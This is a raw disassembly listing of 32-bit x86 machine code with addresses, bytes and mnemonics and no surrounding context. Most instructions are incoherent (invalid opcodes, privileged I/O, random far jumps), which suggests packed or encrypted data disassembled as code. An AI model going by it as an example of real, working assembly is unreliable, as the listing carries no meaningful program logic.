  430071:	e3 78                	jecxz  0x4300eb
  430073:	fa                   	cli
  430074:	98                   	cwtl
  430075:	f2 8f                	repnz (bad)
  430077:	3d 34 c5 ee a2       	cmp    $0xa2eec534,%eax
  43007c:	63 02                	arpl   %eax,(%edx)
  43007e:	31 f6                	xor    %esi,%esi
  430080:	06                   	push   %es
  430081:	4d                   	dec    %ebp
  430082:	e7 9b                	out    %eax,$0x9b
  430084:	06                   	push   %es
  430085:	71 f3                	jno    0x43007a
  430087:	c4 b5 00 f7 ba 2d    	les    0x2dbaf700(%ebp),%esi
  43008d:	cf                   	iret
  43008e:	dd 14 80             	fstl   (%eax,%eax,4)
  430091:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  430092:	87 50 b0             	xchg   %edx,-0x50(%eax)
  430095:	cc                   	int3
  430096:	ca a4 7d             	lret   $0x7da4
  430099:	fb                   	sti
  43009a:	0e                   	push   %cs
  43009b:	c1 73 cb 88          	shll   $0x88,-0x35(%ebx)
  43009f:	44                   	inc    %esp
  4300a0:	e1 c4                	loope  0x430066
  4300a2:	13 c5                	adc    %ebp,%eax
  4300a4:	f1                   	int1
  4300a5:	05 45 36 07 ea       	add    $0xea073645,%eax
  4300aa:	11 03                	adc    %eax,(%ebx)
  4300ac:	59                   	pop    %ecx
  4300ad:	9a 28 7c 45 13 74 cc 	lcall  $0xcc74,$0x13457c28
  4300b4:	63 7f de             	arpl   %edi,-0x22(%edi)
  4300b7:	76 59                	jbe    0x430112
  4300b9:	d8 bd c2 73 a7 5f    	fdivrs 0x5fa773c2(%ebp)
  4300bf:	36 7f b7             	ss jg  0x430079
  4300c2:	da cf                	fcmove %st(7),%st
  4300c4:	9a e6 c0 07 17 1e fc 	lcall  $0xfc1e,$0x1707c0e6
  4300cb:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4300cc:	c4 78 11             	les    0x11(%eax),%edi
  4300cf:	24 6a                	and    $0x6a,%al
  4300d1:	ca d7 af             	lret   $0xafd7
  4300d4:	7b 58                	jnp    0x43012e
  4300d6:	20 0f                	and    %cl,(%edi)
  4300d8:	86 81 a6 17 f7 5d    	xchg   %al,0x5df717a6(%ecx)
  4300de:	71 d2                	jno    0x4300b2
  4300e0:	a8 07                	test   $0x7,%al
  4300e2:	0c fc                	or     $0xfc,%al
  4300e4:	c4 3a                	les    (%edx),%edi
  4300e6:	c1 01 9d             	roll   $0x9d,(%ecx)
  4300e9:	13 72 bc             	adc    -0x44(%edx),%esi
  4300ec:	b8 3e 18 14 2d       	mov    $0x2d14183e,%eax
  4300f1:	dc c8                	fmul   %st,%st(0)
  4300f3:	de 30                	fidivs (%eax)
  4300f5:	5d                   	pop    %ebp
  4300f6:	22 95 17 10 48 dd    	and    -0x22b7efe9(%ebp),%dl
  4300fc:	b0 7c                	mov    $0x7c,%al
  4300fe:	b1 05                	mov    $0x5,%cl
  430100:	a3 bb 1a 00 ef       	mov    %eax,0xef001abb
  430105:	41                   	inc    %ecx
  430106:	21 48 fb             	and    %ecx,-0x5(%eax)
  430109:	48                   	dec    %eax
  43010a:	62 e2 74 93 bb       	(bad)
  43010f:	72 58                	jb     0x430169
  430111:	aa                   	stos   %al,%es:(%edi)
  430112:	e5 b9                	in     $0xb9,%eax
  430114:	cd eb                	int    $0xeb
  430116:	51                   	push   %ecx
  430117:	95                   	xchg   %eax,%ebp
  430118:	3d 83 12 fd b4       	cmp    $0xb4fd1283,%eax
  43011d:	27                   	daa
  43011e:	3d 70 91 1d 1a       	cmp    $0x1a1d9170,%eax
  430123:	90                   	nop
  430124:	9d                   	popf
  430125:	cc                   	int3
  430126:	58                   	pop    %eax
  430127:	f7 9d 46 c0 61 bc    	negl   -0x439e3fba(%ebp)
  43012d:	69 38 52 ae 4a 33    	imul   $0x334aae52,(%eax),%edi
  430133:	e0 19                	loopne 0x43014e
  430135:	f3 11 ca             	repz adc %ecx,%edx
  430138:	0a e0                	or     %al,%ah
  43013a:	92                   	xchg   %eax,%edx
  43013b:	e1 01                	loope  0x43013e
  43013d:	46                   	inc    %esi
  43013e:	03 ed                	add    %ebp,%ebp
  430140:	02 d8                	add    %al,%bl
  430142:	e9 0f df 8a 02       	jmp    0x2cde056
  430147:	b3 5d                	mov    $0x5d,%bl
  430149:	ab                   	stos   %eax,%es:(%edi)
  43014a:	77 6f                	ja     0x4301bb
  43014c:	52                   	push   %edx
  43014d:	77 f0                	ja     0x43013f
  43014f:	82 c7 3d             	add    $0x3d,%bh
  430152:	cc                   	int3
  430153:	ce                   	into
  430154:	32 fb                	xor    %bl,%bh
  430156:	19 dc                	sbb    %ebx,%esp
  430158:	bc 6c 29 67 82       	mov    $0x8267296c,%esp
  43015d:	37                   	aaa
  43015e:	be 36 26 88 98       	mov    $0x98882636,%esi
  430163:	b1 bc                	mov    $0xbc,%cl
  430165:	d4 7f                	aam    $0x7f
  430167:	d8 e7                	fsub   %st(7),%st
  430169:	d7                   	xlat   %ds:(%ebx)
  43016a:	13 29                	adc    (%ecx),%ebp
  43016c:	c3                   	ret
  43016d:	f6 3e                	idivb  (%esi)
  43016f:	cd 78                	int    $0x78
  430171:	02 57 35             	add    0x35(%edi),%dl
  430174:	4e                   	dec    %esi
  430175:	11 d9                	adc    %ebx,%ecx
  430177:	c3                   	ret
  430178:	ff b2 d3 c0 2b fa    	push   -0x5d43f2d(%edx)
  43017e:	2f                   	das
  43017f:	f9                   	stc
  430180:	dd 55 49             	fstl   0x49(%ebp)
  430183:	25 6d ef 7c a2       	and    $0xa27cef6d,%eax
  430188:	2f                   	das
  430189:	40                   	inc    %eax
  43018a:	1e                   	push   %ds
  43018b:	c8 7a 7b dd          	enter  $0x7b7a,$0xdd
  43018f:	85 6f 16             	test   %ebp,0x16(%edi)
  430192:	e1 7e                	loope  0x430212
  430194:	5a                   	pop    %edx
  430195:	d6                   	salc
  430196:	c2 bf 5f             	ret    $0x5fbf
  430199:	2a 25 5a d9 0f 4e    	sub    0x4e0fd95a,%ah
  43019f:	bf 60 85 0c c5       	mov    $0xc50c8560,%edi
  4301a4:	07                   	pop    %es
  4301a5:	ca 1b de             	lret   $0xde1b
  4301a8:	fc                   	cld
  4301a9:	57                   	push   %edi
  4301aa:	c7                   	(bad)
  4301ab:	7d 6c                	jge    0x430219
  4301ad:	70 5c                	jo     0x43020b
  4301af:	c0 ba ea b2 0c e0 0a 	sarb   $0xa,-0x1ff34d16(%edx)
  4301b6:	d8 46 9a             	fadds  -0x66(%esi)
  4301b9:	2b 69 f5             	sub    -0xb(%ecx),%ebp
  4301bc:	30 85 55 02 61 86    	xor    %al,-0x799efdab(%ebp)
  4301c2:	e5 a7                	in     $0xa7,%eax
  4301c4:	7e 7b                	jle    0x430241
  4301c6:	ad                   	lods   %ds:(%esi),%eax
  4301c7:	23 c8                	and    %eax,%ecx
  4301c9:	d3 5a b7             	rcrl   %cl,-0x49(%edx)
  4301cc:	64 ec                	fs in  (%dx),%al
  4301ce:	0c fd                	or     $0xfd,%al
  4301d0:	56                   	push   %esi
  4301d1:	dc 90 05 b4 92 9d    	fcoml  -0x626d4bfb(%eax)
  4301d7:	46                   	inc    %esi
  4301d8:	87 8a 6f 7f f0 cc    	xchg   %ecx,-0x330f8091(%edx)
  4301de:	1d 2c eb ff 44       	sbb    $0x44ffeb2c,%eax
  4301e3:	22 79 6a             	and    0x6a(%ecx),%bh
  4301e6:	bd 1a e2 cb 41       	mov    $0x41cbe21a,%ebp
  4301eb:	48                   	dec    %eax
  4301ec:	9b                   	fwait
  4301ed:	4d                   	dec    %ebp
  4301ee:	7a be                	jp     0x4301ae
  4301f0:	e1 d4                	loope  0x4301c6
  4301f2:	8a 4b 10             	mov    0x10(%ebx),%cl
  4301f5:	9a 5f 19 d8 20 fa 9d 	lcall  $0x9dfa,$0x20d8195f
  4301fc:	9e                   	sahf
  4301fd:	fb                   	sti
  4301fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4301ff:	96                   	xchg   %eax,%esi
  430200:	6c                   	insb   (%dx),%es:(%edi)
  430201:	32 33                	xor    (%ebx),%dh
  430203:	55                   	push   %ebp
  430204:	1d 8a 9a ef c1       	sbb    $0xc1ef9a8a,%eax
  430209:	7f 27                	jg     0x430232
  43020b:	82 d1 71             	adc    $0x71,%cl
  43020e:	94                   	xchg   %eax,%esp
  43020f:	cf                   	iret
  430210:	ad                   	lods   %ds:(%esi),%eax
  430211:	41                   	inc    %ecx
  430212:	48                   	dec    %eax
  430213:	af                   	scas   %es:(%edi),%eax
  430214:	fc                   	cld
  430215:	f4                   	hlt
  430216:	24 4a                	and    $0x4a,%al
  430218:	49                   	dec    %ecx
  430219:	3d e9 a1 bd bb       	cmp    $0xbbbda1e9,%eax
  43021e:	e9 5f b8 54 4b       	jmp    0x4b97ba82
  430223:	d7                   	xlat   %ds:(%ebx)
  430224:	49                   	dec    %ecx
  430225:	9f                   	lahf
  430226:	64 7c a0             	fs jl  0x4301c9
  430229:	f2 bb d3 bd 2f b0    	repnz mov $0xb02fbdd3,%ebx
  43022f:	b3 eb                	mov    $0xeb,%bl
  430231:	ec                   	in     (%dx),%al
  430232:	6a 35                	push   $0x35
  430234:	fb                   	sti
  430235:	97                   	xchg   %eax,%edi
  430236:	f5                   	cmc
  430237:	d2 46 58             	rolb   %cl,0x58(%esi)
  43023a:	55                   	push   %ebp
  43023b:	63 7d ef             	arpl   %edi,-0x11(%ebp)
  43023e:	85 c1                	test   %eax,%ecx
  430240:	cf                   	iret
  430241:	c1 52 86 2f          	rcll   $0x2f,-0x7a(%edx)
  430245:	fb                   	sti
  430246:	1b 45 96             	sbb    -0x6a(%ebp),%eax
  430249:	4e                   	dec    %esi
  43024a:	ee                   	out    %al,(%dx)
  43024b:	4b                   	dec    %ebx
  43024c:	91                   	xchg   %eax,%ecx
  43024d:	fe 8b 68 1b e7 52    	decb   0x52e71b68(%ebx)
  430253:	6f                   	outsl  %ds:(%esi),(%dx)
  430254:	58                   	pop    %eax
  430255:	09 cd                	or     %ecx,%ebp
  430257:	f5                   	cmc
  430258:	2f                   	das
  430259:	44                   	inc    %esp
  43025a:	ea ba 7f 62 9a 00 9b 	ljmp   $0x9b00,$0x9a627fba
  430261:	ef                   	out    %eax,(%dx)
  430262:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  430263:	ff                   	(bad)
  430264:	b9 cc 65 a8 64       	mov    $0x64a865cc,%ecx
  430269:	6b 96 6c c1 f1 00 2f 	imul   $0x2f,0xf1c16c(%esi),%edx
  430270:	c7                   	(bad)
  430271:	71 51                	jno    0x4302c4
  430273:	a2 b3 cc f7 a5       	mov    %al,0xa5f7ccb3
  430278:	97                   	xchg   %eax,%edi
  430279:	72 ab                	jb     0x430226
  43027b:	b4 fa                	mov    $0xfa,%ah
  43027d:	4b                   	dec    %ebx
  43027e:	d8 f9                	fdivr  %st(1),%st
  430280:	13 56 b2             	adc    -0x4e(%esi),%edx
  430283:	62 23                	bound  %esp,(%ebx)
  430285:	43                   	inc    %ebx
  430286:	00 12                	add    %dl,(%edx)
  430288:	03 22                	add    (%edx),%esp
  43028a:	37                   	aaa
  43028b:	a3 b9 da 3e 18       	mov    %eax,0x183edab9
  430290:	25 d7 a3 d9 2e       	and    $0x2ed9a3d7,%eax
  430295:	cd e2                	int    $0xe2
  430297:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  430298:	ae                   	scas   %es:(%edi),%al
  430299:	b8 68 b6 3f 5f       	mov    $0x5f3fb668,%eax
  43029e:	6f                   	outsl  %ds:(%esi),(%dx)
  43029f:	60                   	pusha
  4302a0:	40                   	inc    %eax
  4302a1:	28 ec                	sub    %ch,%ah
  4302a3:	1d 01 e9 ac 5b       	sbb    $0x5bace901,%eax
  4302a8:	30 a4 2a fd d7 4f 67 	xor    %ah,0x674fd7fd(%edx,%ebp,1)
  4302af:	ab                   	stos   %eax,%es:(%edi)
  4302b0:	30 f8                	xor    %bh,%al
  4302b2:	62 69 f8             	bound  %ebp,-0x8(%ecx)
  4302b5:	44                   	inc    %esp
  4302b6:	ad                   	lods   %ds:(%esi),%eax
  4302b7:	be d1 f7 2e e2       	mov    $0xe22ef7d1,%esi
  4302bc:	56                   	push   %esi
  4302bd:	24 fb                	and    $0xfb,%al
  4302bf:	28 43 92             	sub    %al,-0x6e(%ebx)
  4302c2:	6c                   	insb   (%dx),%es:(%edi)
  4302c3:	23 fd                	and    %ebp,%edi
  4302c5:	c4 ad 71 9e 8e aa    	les    -0x5571618f(%ebp),%ebp
  4302cb:	11 65 e5             	adc    %esp,-0x1b(%ebp)
  4302ce:	a9 e3 52 9a 3e       	test   $0x3e9a52e3,%eax
  4302d3:	90                   	nop
  4302d4:	4c                   	dec    %esp
  4302d5:	61                   	popa
  4302d6:	ec                   	in     (%dx),%al
  4302d7:	66 b3 6c             	data16 mov $0x6c,%bl
  4302da:	bd d8 ae c3 a4       	mov    $0xa4c3aed8,%ebp
  4302df:	83 3d 52 40 93 78 40 	cmpl   $0x40,0x78934052
  4302e6:	95                   	xchg   %eax,%ebp
  4302e7:	6c                   	insb   (%dx),%es:(%edi)
  4302e8:	34 19                	xor    $0x19,%al
  4302ea:	6c                   	insb   (%dx),%es:(%edi)
  4302eb:	40                   	inc    %eax
  4302ec:	46                   	inc    %esi
  4302ed:	9e                   	sahf
  4302ee:	95                   	xchg   %eax,%ebp
  4302ef:	ae                   	scas   %es:(%edi),%al
  4302f0:	53                   	push   %ebx
  4302f1:	81 75 0b 35 da 0c ff 	xorl   $0xff0cda35,0xb(%ebp)
  4302f8:	da d4                	fcmovbe %st(4),%st
  4302fa:	63 64 42 b6          	arpl   %esp,-0x4a(%edx,%eax,2)
  4302fe:	f2 ec                	repnz in (%dx),%al
  430300:	8c 10                	mov    %ss,(%eax)
  430302:	67 e5 e8             	addr16 in $0xe8,%eax
  430305:	70 09                	jo     0x430310
  430307:	e9 e3 7c 6c 95       	jmp    0x95af7fef
  43030c:	58                   	pop    %eax
  43030d:	6b 84 c2 fe 9f a9 7d 	imul   $0x1e,0x7da99ffe(%edx,%eax,8),%eax
  430314:	1e 
  430315:	eb c3                	jmp    0x4302da
  430317:	d5 29                	aad    $0x29
  430319:	41                   	inc    %ecx
  43031a:	cd 54                	int    $0x54
  43031c:	53                   	push   %ebx
  43031d:	cd ca                	int    $0xca
  43031f:	19 73 78             	sbb    %esi,0x78(%ebx)
  430322:	08 d8                	or     %bl,%al
  430324:	c4 53 16             	les    0x16(%ebx),%edx
  430327:	60                   	pusha
  430328:	1c ec                	sbb    $0xec,%al
  43032a:	f2 b0 b0             	repnz mov $0xb0,%al
  43032d:	33 27                	xor    (%edi),%esp
  43032f:	2e c6                	cs (bad)
  430331:	e9 78 f4 74 25       	jmp    0x25b7f7ae
  430336:	ec                   	in     (%dx),%al
  430337:	94                   	xchg   %eax,%esp
  430338:	36 10 d9             	ss adc %bl,%cl
  43033b:	97                   	xchg   %eax,%edi
  43033c:	cd 27                	int    $0x27
  43033e:	44                   	inc    %esp
  43033f:	73 6d                	jae    0x4303ae
  430341:	a1 a5 9d f8 c3       	mov    0xc3f89da5,%eax
  430346:	41                   	inc    %ecx
  430347:	82 cf ec             	or     $0xec,%bh
  43034a:	3b 87 8d 82 00 b2    	cmp    -0x4dff7d73(%edi),%eax
  430350:	97                   	xchg   %eax,%edi
  430351:	bc 47 04 58 ef       	mov    $0xef580447,%esp
  430356:	a0 2f d5 e5 31       	mov    0x31e5d52f,%al
  43035b:	18 63 f2             	sbb    %ah,-0xe(%ebx)
  43035e:	ae                   	scas   %es:(%edi),%al
  43035f:	29 7f 87             	sub    %edi,-0x79(%edi)
  430362:	bb 7b 6c 74 25       	mov    $0x25746c7b,%ebx
  430367:	09 ce                	or     %ecx,%esi
  430369:	17                   	pop    %ss
  43036a:	d0 5b cb             	rcrb   $1,-0x35(%ebx)
  43036d:	df a7 92 d2 13 b1    	fbld   -0x4eec2d6e(%edi)
  430373:	2c c5                	sub    $0xc5,%al
  430375:	96                   	xchg   %eax,%esi
  430376:	2e 7c 5a             	jl,pn  0x4303d3
  430379:	72 7f                	jb     0x4303fa
  43037b:	87 f2                	xchg   %esi,%edx
  43037d:	3e 03 5e 80          	add    %ds:-0x80(%esi),%ebx
  430381:	88 15 b6 df 57 fd    	mov    %dl,0xfd57dfb6
  430387:	84 43 3d             	test   %al,0x3d(%ebx)
  43038a:	03 a7 14 4e 80 69    	add    0x69804e14(%edi),%esp
  430390:	87 b4 ee cc f5 49 b5 	xchg   %esi,-0x4ab60a34(%esi,%ebp,8)
  430397:	9d                   	popf
  430398:	07                   	pop    %es
  430399:	dc a1 cf e2 1f 6f    	fsubl  0x6f1fe2cf(%ecx)
  43039f:	34 af                	xor    $0xaf,%al
  4303a1:	44                   	inc    %esp
  4303a2:	c4 bc 0b 74 4f d2 36 	les    0x36d24f74(%ebx,%ecx,1),%edi
  4303a9:	9a 6a 23 01 8d 5b 18 	lcall  $0x185b,$0x8d01236a
  4303b0:	8c d5                	mov    %ss,%ebp
  4303b2:	12 7e 84             	adc    -0x7c(%esi),%bh
  4303b5:	1c 87                	sbb    $0x87,%al
  4303b7:	94                   	xchg   %eax,%esp
  4303b8:	f7 c0 40 e7 6e a9    	test   $0xa96ee740,%eax
  4303be:	d9 94 e5 56 ec 37 3b 	fsts   0x3b37ec56(%ebp,%eiz,8)
  4303c5:	b7 4a                	mov    $0x4a,%bh
  4303c7:	63 50 33             	arpl   %edx,0x33(%eax)
  4303ca:	0e                   	push   %cs
  4303cb:	f3 4b                	repz dec %ebx
  4303cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4303ce:	e9 ea 36 08 d9       	jmp    0xd94b3abd
  4303d3:	70 92                	jo     0x430367
  4303d5:	c9                   	leave
  4303d6:	1a 4d e9             	sbb    -0x17(%ebp),%cl
  4303d9:	f8                   	clc
  4303da:	bc b6 e4 d2 2c       	mov    $0x2cd2e4b6,%esp
  4303df:	15 c6 01 37 e5       	adc    $0xe53701c6,%eax
  4303e4:	95                   	xchg   %eax,%ebp
  4303e5:	af                   	scas   %es:(%edi),%eax
  4303e6:	81 83 ba c1 ae ec b8 	addl   $0x88b25bb8,-0x13513e46(%ebx)
  4303ed:	5b b2 88 
  4303f0:	03 22                	add    (%edx),%esp
  4303f2:	35 e5 cf fb 83       	xor    $0x83fbcfe5,%eax
  4303f7:	dc 5e fb             	fcompl -0x5(%esi)
  4303fa:	09 c7                	or     %eax,%edi
  4303fc:	56                   	push   %esi
  4303fd:	16                   	push   %ss
  4303fe:	1c 6f                	sbb    $0x6f,%al
  430400:	c4 a0 5c da 46 e3    	les    -0x1cb925a4(%eax),%esp
  430406:	cc                   	int3
  430407:	39 a2 fc 9b cd ea    	cmp    %esp,-0x15326404(%edx)
  43040d:	64 da f3             	fs (bad)
  430410:	65 34 16             	gs xor $0x16,%al
  430413:	a0 4f 1c fc 91       	mov    0x91fc1c4f,%al
  430418:	86 26                	xchg   %ah,(%esi)
  43041a:	dd c3                	ffree  %st(3)
  43041c:	28 64 fe 29          	sub    %ah,0x29(%esi,%edi,8)
  430420:	3e ae                	ds scas %es:(%edi),%al
  430422:	95                   	xchg   %eax,%ebp
  430423:	99                   	cltd
  430424:	7a 5c                	jp     0x430482
  430426:	e7 a5                	out    %eax,$0xa5
  430428:	db f5                	fcomi  %st(5),%st
  43042a:	22 07                	and    (%edi),%al
  43042c:	5b                   	pop    %ebx
  43042d:	60                   	pusha
  43042e:	ed                   	in     (%dx),%eax
  43042f:	03 e0                	add    %eax,%esp
  430431:	ac                   	lods   %ds:(%esi),%al
  430432:	4f                   	dec    %edi
  430433:	1b 9a d2 ca 94 12    	sbb    0x1294cad2(%edx),%ebx
  430439:	8c 96 e9 3b 0f ac    	mov    %ss,-0x53f0c417(%esi)
  43043f:	33 36                	xor    (%esi),%esi
  430441:	45                   	inc    %ebp
  430442:	fa                   	cli
  430443:	08 2a                	or     %ch,(%edx)
  430445:	66 c1 b5 0a 06 35 ed 	shlw   $0x7a,-0x12caf9f6(%ebp)
  43044c:	7a 
  43044d:	7a 5d                	jp     0x4304ac
  43044f:	63 aa db d6 21 e4    	arpl   %ebp,-0x1bde2925(%edx)
  430455:	11 bf 8c 57 7c 9f    	adc    %edi,-0x6083a874(%edi)
  43045b:	b7 95                	mov    $0x95,%bh
  43045d:	01 47 29             	add    %eax,0x29(%edi)
  430460:	6d                   	insl   (%dx),%es:(%edi)
  430461:	50                   	push   %eax
  430462:	11 d9                	adc    %ebx,%ecx
  430464:	d5 6f                	aad    $0x6f
  430466:	06                   	push   %es
  430467:	8e 5c 9f 5c          	mov    0x5c(%edi,%ebx,4),%ds
  43046b:	53                   	push   %ebx
  43046c:	b4 7d                	mov    $0x7d,%ah
  43046e:	78 5a                	js     0x4304ca
  430470:	6d                   	insl   (%dx),%es:(%edi)
  430471:	4e                   	dec    %esi
  430472:	0f 06                	clts
  430474:	8e c6                	mov    %esi,%es
  430476:	36 bb 84 36 21 f2    	ss mov $0xf2213684,%ebx
  43047c:	d8 21                	fsubs  (%ecx)
  43047e:	70 57                	jo     0x4304d7
  430480:	b4 a2                	mov    $0xa2,%ah
  430482:	6f                   	outsl  %ds:(%esi),(%dx)
  430483:	bb 2e 79 b8 5b       	mov    $0x5bb8792e,%ebx
  430488:	12 a9 3a 03 6f 03    	adc    0x36f033a(%ecx),%ch
  43048e:	d6                   	salc
  43048f:	07                   	pop    %es
  430490:	35 fa 28 2c 83       	xor    $0x832c28fa,%eax
  430495:	00 ac fb cf 4c 4e 40 	add    %ch,0x404e4ccf(%ebx,%edi,8)
  43049c:	c5 81 d3 a0 a3 33    	lds    0x33a3a0d3(%ecx),%eax
  4304a2:	43                   	inc    %ebx
  4304a3:	4b                   	dec    %ebx
  4304a4:	d8 25 5f a7 c0 c9    	fsubs  0xc9c0a75f
  4304aa:	76 3a                	jbe    0x4304e6
  4304ac:	95                   	xchg   %eax,%ebp
  4304ad:	aa                   	stos   %al,%es:(%edi)
  4304ae:	08 9c 74 0b ff c2 f0 	or     %bl,-0xf3d00f5(%esp,%esi,2)
  4304b5:	f2 ab                	repnz stos %eax,%es:(%edi)
  4304b7:	8c 0d 49 a6 6a bd    	mov    %cs,0xbd6aa649
  4304bd:	91                   	xchg   %eax,%ecx
  4304be:	6d                   	insl   (%dx),%es:(%edi)
  4304bf:	81 34 83 b8 13 b3 14 	xorl   $0x14b313b8,(%ebx,%eax,4)
  4304c6:	29 8e 0c ac 2d 1c    	sub    %ecx,0x1c2dac0c(%esi)
  4304cc:	0b 7c fe 30          	or     0x30(%esi,%edi,8),%edi
  4304d0:	1d f7 fe e3 13       	sbb    $0x13e3fef7,%eax
  4304d5:	1d 5e 02 b2 45       	sbb    $0x45b2025e,%eax
  4304da:	a3 b0 c3 23 2a       	mov    %eax,0x2a23c3b0
  4304df:	99                   	cltd
  4304e0:	2e 05 09 de cb 81    	cs add $0x81cbde09,%eax
  4304e6:	4b                   	dec    %ebx
  4304e7:	04 7e                	add    $0x7e,%al
  4304e9:	e4 3e                	in     $0x3e,%al
  4304eb:	ac                   	lods   %ds:(%esi),%al
  4304ec:	d8 9a 47 05 65 6b    	fcomps 0x6b650547(%edx)
  4304f2:	55                   	push   %ebp
  4304f3:	54                   	push   %esp
  4304f4:	9b                   	fwait
  4304f5:	98                   	cwtl
  4304f6:	b9 df be 89 5a       	mov    $0x5a89bedf,%ecx
  4304fb:	52                   	push   %edx
  4304fc:	58                   	pop    %eax
  4304fd:	e7 d7                	out    %eax,$0xd7
  4304ff:	f5                   	cmc
  430500:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  430501:	a3 21 89 85 13       	mov    %eax,0x13858921
  430506:	54                   	push   %esp
  430507:	46                   	inc    %esi
  430508:	c9                   	leave
  430509:	f8                   	clc
  43050a:	3d f8 98 31 66       	cmp    $0x663198f8,%eax
  43050f:	2e 4e                	cs dec %esi
  430511:	96                   	xchg   %eax,%esi
  430512:	ed                   	in     (%dx),%eax
  430513:	86 bc 94 f0 2c 51 ea 	xchg   %bh,-0x15aed310(%esp,%edx,4)
  43051a:	aa                   	stos   %al,%es:(%edi)
  43051b:	ac                   	lods   %ds:(%esi),%al
  43051c:	19 d7                	sbb    %edx,%edi
  43051e:	b2 99                	mov    $0x99,%dl
  430520:	e5 21                	in     $0x21,%eax
  430522:	d6                   	salc
  430523:	56                   	push   %esi
  430524:	58                   	pop    %eax
  430525:	e3 55                	jecxz  0x43057c
  430527:	2f                   	das
  430528:	35 ea 3a ea 91       	xor    $0x91ea3aea,%eax
  43052d:	ae                   	scas   %es:(%edi),%al
  43052e:	a1 c4 e5 49 40       	mov    0x4049e5c4,%eax
  430533:	d6                   	salc
  430534:	77 23                	ja     0x430559
  430536:	e6 04                	out    %al,$0x4
  430538:	6e                   	outsb  %ds:(%esi),(%dx)
  430539:	3b 76 17             	cmp    0x17(%esi),%esi
  43053c:	c0 96 e0 ba 9a a9 09 	rclb   $0x9,-0x56654520(%esi)
  430543:	6c                   	insb   (%dx),%es:(%edi)
  430544:	c4 08                	les    (%eax),%ecx
  430546:	74 5f                	je     0x4305a7
  430548:	ef                   	out    %eax,(%dx)
  430549:	6c                   	insb   (%dx),%es:(%edi)
  43054a:	54                   	push   %esp
  43054b:	93                   	xchg   %eax,%ebx
  43054c:	88 ca                	mov    %cl,%dl
  43054e:	02 46 59             	add    0x59(%esi),%al
  430551:	54                   	push   %esp
  430552:	1b ea                	sbb    %edx,%ebp
  430554:	2c 41                	sub    $0x41,%al
  430556:	c1 7c 2e 0a cd       	sarl   $0xcd,0xa(%esi,%ebp,1)
  43055b:	e4 f2                	in     $0xf2,%al
  43055d:	62 93 d5 28 50 d3    	bound  %edx,-0x2cafd72b(%ebx)
  430563:	b2 19                	mov    $0x19,%dl
  430565:	72 ea                	jb     0x430551
  430567:	01 35 ca f9 a5 5b    	add    %esi,0x5ba5f9ca
  43056d:	97                   	xchg   %eax,%edi
  43056e:	32 15 48 d0 fa 78    	xor    0x78fad048,%dl
  430574:	ff 22                	jmp    *(%edx)
  430576:	e4 47                	in     $0x47,%al
  430578:	34 f6                	xor    $0xf6,%al
  43057a:	83 fa 5f             	cmp    $0x5f,%edx
  43057d:	d7                   	xlat   %ds:(%ebx)
  43057e:	32 d6                	xor    %dh,%dl
  430580:	37                   	aaa
  430581:	af                   	scas   %es:(%edi),%eax
  430582:	ce                   	into
  430583:	48                   	dec    %eax
  430584:	0a a7 c8 98 f2 d3    	or     -0x2c0d6738(%edi),%ah
  43058a:	ff 41 c0             	incl   -0x40(%ecx)
  43058d:	9b                   	fwait
  43058e:	8e cf                	mov    %edi,%cs
  430590:	a2 78 de 8f 45       	mov    %al,0x458fde78
  430595:	c4                   	(bad)
  430596:	cc                   	int3
  430597:	d2 1e                	rcrb   %cl,(%esi)
  430599:	49                   	dec    %ecx
  43059a:	b3 90                	mov    $0x90,%bl
  43059c:	63 39                	arpl   %edi,(%ecx)
  43059e:	2c 43                	sub    $0x43,%al
  4305a0:	f5                   	cmc
  4305a1:	a2 15 21 33 94       	mov    %al,0x94332115
  4305a6:	92                   	xchg   %eax,%edx
  4305a7:	c8 af 50 b9          	enter  $0x50af,$0xb9
  4305ab:	3c bb                	cmp    $0xbb,%al
  4305ad:	d4 43                	aam    $0x43
  4305af:	f5                   	cmc
  4305b0:	41                   	inc    %ecx
  4305b1:	e7 7f                	out    %eax,$0x7f
  4305b3:	83 32 f0             	xorl   $0xfffffff0,(%edx)
  4305b6:	7e 82                	jle    0x43053a
  4305b8:	83 2b e8             	subl   $0xffffffe8,(%ebx)
  4305bb:	74 f0                	je     0x4305ad
  4305bd:	c1 7e d2 66          	sarl   $0x66,-0x2e(%esi)
  4305c1:	da bc f1 7b 9e 3e d0 	fidivrl -0x2fc16185(%ecx,%esi,8)
  4305c8:	21 d6                	and    %edx,%esi
  4305ca:	57                   	push   %edi
  4305cb:	00 bd 0c a7 2a 01    	add    %bh,0x12aa70c(%ebp)
  4305d1:	7d 3e                	jge    0x430611
  4305d3:	d2 b4 70 55 a4 23 9f 	shlb   %cl,-0x60dc5bab(%eax,%esi,2)
  4305da:	86 46 e1             	xchg   %al,-0x1f(%esi)
  4305dd:	30 aa 8e 24 ef 1e    	xor    %ch,0x1eef248e(%edx)
  4305e3:	d3 f9                	sar    %cl,%ecx
  4305e5:	6b 15 8a 87 42 29 00 	imul   $0x0,0x2942878a,%edx
  4305ec:	72 e7                	jb     0x4305d5
  4305ee:	8b 40 c3             	mov    -0x3d(%eax),%eax
  4305f1:	50                   	push   %eax
  4305f2:	21 42 30             	and    %eax,0x30(%edx)
  4305f5:	82 21 10             	andb   $0x10,(%ecx)
  4305f8:	0f 1b 16             	bndstx %bnd2,(%esi)
  4305fb:	ca e0 cd             	lret   $0xcde0
  4305fe:	5f                   	pop    %edi
  4305ff:	e2 67                	loop   0x430668
  430601:	00 71 04             	add    %dh,0x4(%ecx)
  430604:	4f                   	dec    %edi
  430605:	f5                   	cmc
  430606:	f5                   	cmc
  430607:	c9                   	leave
  430608:	6e                   	outsb  %ds:(%esi),(%dx)
  430609:	fa                   	cli
  43060a:	3b 7b 64             	cmp    0x64(%ebx),%edi
  43060d:	c8 ad f3 00          	enter  $0xf3ad,$0x0
  430611:	13 ea                	adc    %edx,%ebp
  430613:	48                   	dec    %eax
  430614:	10 13                	adc    %dl,(%ebx)
  430616:	0c 28                	or     $0x28,%al
  430618:	2c 4c                	sub    $0x4c,%al
  43061a:	f9                   	stc
  43061b:	cd 8b                	int    $0x8b
  43061d:	b2 f2                	mov    $0xf2,%dl
  43061f:	c3                   	ret
  430620:	e1 8e                	loope  0x4305b0
  430622:	13 87 73 66 5e e3    	adc    -0x1ca1998d(%edi),%eax
